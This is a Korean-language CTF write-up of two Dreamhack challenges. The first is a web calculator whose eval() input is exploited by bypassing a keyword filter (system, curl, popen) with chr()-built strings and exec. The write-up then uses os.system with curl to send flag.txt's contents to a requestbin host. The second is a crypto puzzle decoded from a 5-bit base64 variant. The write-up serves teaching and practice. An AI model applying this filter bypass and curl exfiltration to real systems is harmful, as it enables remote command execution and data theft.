# Web/ Addition calculator

![main_page](images/Pasted%20image%2020231125142823.png)
- 단일 페이지로 구성되어있음
- 입력 -> 연산 -> 출력 순으로 이루어져있는듯


Source Code 1. Filter
```python
def filter(formula):
	w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
	w_list.extend([" ", ".", "(", ")", "+"])
	
	if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
		return True
	for c in formula:
		if c not in w_list:
			return True
```
- 필터링 하는 함수
- 알파벳, 숫자, 특수문자 몇개 빼고는 사용하지 못함
- 직접적으로 system, curl, flag, subprocess, popen 등을 사용하지 못하게 막음

Source Code 2. index
```python
def index():
	if request.method == "GET":
		return render_template("index.html")
	
	else:
		formula = request.form.get("formula", "")
		if formula != "":
			if filter(formula):
				return render_template("index.html", result="Filtered")
			else:
				try:
					formula = eval(formula)
					return render_template("index.html", result=formula)
				except subprocess.CalledProcessError:
					return render_template("index.html", result="Error")
				except:
					return render_template("index.html", result="Error")
		else:
			return render_template("index.html", result="Enter the value")
```
- get 일때 기본 페이지
- post 일때 연산해서 결과값 보여주는 페이지
- post 로 보낸 데이터를 필터링하고 걸리지않으면 eval함수를 수행해서 결과값 반환
	- 여기가 취약점
- 필터에 걸리면 error 값으로 보냄


pre-exploit 1. 필터 우회
1) eval 안에 어떤 텍스트 값으로 넣으면 필터를 우회할수 있는지 확인
	- `os.system('ls')` 이 명령어를 실행할수 있는지 부터 확인
	- `app.py` 에 os 도 import 되지 않았으므로 os도 추가해야함.
	- `system`과 `'`(quote)는 필터링 함수에 걸리므로 사용 불가능 
	- chr 함수와 ascii 코드를 사용해서 텍스트를 만들고 실행되는지 확인
2) 명령어를 ascii 코드로 변경하는 코드 생성
```python
def test():
	txt1 = 'os.system(\'ls\')'
	ret_text = ''
	for ch in txt1:
		ret_text += f'chr({ord(ch)})+'
	print(ret_text[:-1]) 
```
3) 명령어 직접 수행
	- 위에서 나온 결과값 실행 `chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41)`
	- ![pre-exploit1-1](images/Pasted%20image%2020231125144440.png)
	- 변환되는 것 확인
4) 서버 수행값 확인
	- 실제 서버에서 텍스트값으로만 나오는지 실행까지 되는지 확인해야함.
	- 돌아가는지만 확인할 코드 생성(필터함수 그대로 사용)
	- ![pre-exploit1-2](images/Pasted%20image%2020231125144929.png)
	- 딱히 수행되는 건 없고 텍스트로만 반환됨. 
```python
def main(exprs: list[str]):
	for expr in exprs:
		formula = exprs
		if filter(expr):
			print("filtered")
			continue
		try:
			formula = eval(expr)
			print("ret: ", formula, type(formula))
		except Exception as e:
			print("error", e)
		print()
```

5) 앞뒤로 eval이나 exac를 붙여서 재확인
	- `exec(str(chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41)))`
	- ![pre-exploit1-3](images/Pasted%20image%2020231125145438.png)
	- ![pre-exploit1-4](images/Pasted%20image%2020231125145511.png)
	- 가상 서버에선 ls가 수행되는걸 볼수있고 None을 반환함
	- 실제 서버에선 Error 발생. os 모듈이 임포트 되지 않아서 생기는 문제나 None을 반환해서 에러가 뜨는 것으로 보임
6) flag.txt를 읽을수 있는 명령어 생성 
	- `'exec("import os; os.system(\'cat flag.txt\')")'`
	- ![pre-exploit1-5](images/Pasted%20image%2020231125150440.png)
	- 가상서버에선 플래그 값을 확인할수 있음.
	- 위 텍스트를 test 함수로 돌린 값을 실제 서버에 넣으면 `Enter the value` 로 나옴 (None 값이라 그런듯)

exploit. 서버 데이터 우회 전송
1) 리버스 쉘을 사용해서 플래그 서버에서 내가 볼수있는 서버로 데이터를 전송해야함. 드림핵 툴 사용
	- https://tools.dreamhack.games/requestbin
2) 데이터를 전송하기 위한 명령어 작성
	- test 함수 그대로 사용하고 텍스트만 아래로 변경
	- `txt1 = f'exec(\"import os; os.system(\'curl {server_url} -d \\"$(cat flag.txt)\\"\')\")'`
	- 여기서 나온 텍스트를 가상 서버에서 돌리면 curl 명령어가 실행되면서 ip가 찍히고 드림핵 툴에서 값을 확인할수 있음.
	- ![exploit-1](images/Pasted%20image%2020231125151030.png)
3) 같은 명령어를 실제 서버에 입력 후 드림핵 툴 확인
	- ![exploit-2](images/Pasted%20image%2020231125151255.png)


# Crypto/ likeb64

base 64 인코딩하는 것처럼 디코딩 해주면된다.
hint로 주어져있는 값의 개수가 32이므로 6비트가 아닌 5비트로 잘라 인코딩 했다고 생각이 든다.

디코딩 하는 순서는 1) 암호화된 텍스트에서 각 글자를 5 bit 길이에 맞는 이진수로 변환하고 2) 8자리씩 끊어서 복구한다.

exploit
```python
enc = 'IREHWYJZMEcGCODGMMbTENDDGcbGEMJZGEbGEZTFGYaGKNRTMIcGIMBSGRQTSNDDGAaWGYZRHEbGCNRQMUaDOMbEMRTGEYJYGUaWGOJQMYZHa==='

usr_ord = dict()
usr_base64= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef'

for idx, ch in enumerate(usr_base64):
	usr_ord[ch] = idx
```
- 쉽게 디코딩하기 위한 선작업

1) 암호화된 텍스트의 각 글자를 이진수로 변환
```python
# step1

step1 = ''

for ch in enc:
	if ch == '=':
		continue
	temp_str = bin(usr_ord[ch])[2:].zfill(5)
	step1 += temp_str
	# print(step1, len(step1))
```
- `010001000100100001111011011000010011100101100001001110000110000100111000011001100110001100110111001100100011010001100011001101110011011001100010001100010011100100110001001101100110001001100110011001010011011000110100011001010011011000110011011000100011100001100100001100000011001000110100011000010011100100110100011000110011000000110101011000110110001100110001001110010011011001100001001101100011000001100101001101000011011100110011011001000110010001100110011000100110000100111000001101010011010101100011001110010011000001100110001100100111110100000000`

2) 8자리씩 읽어 ascii 값 복구
```python
for i in range(0, len(step1)-1, 8):
	tmp = int(step1[i:i+8], 2)
	print(chr(tmp), end='')
	print()
```
출력값
- `DH{a9a8a8fc724c76b1916bfe64e63b8d024a94c05cc196a60e473ddfba855c90f2}

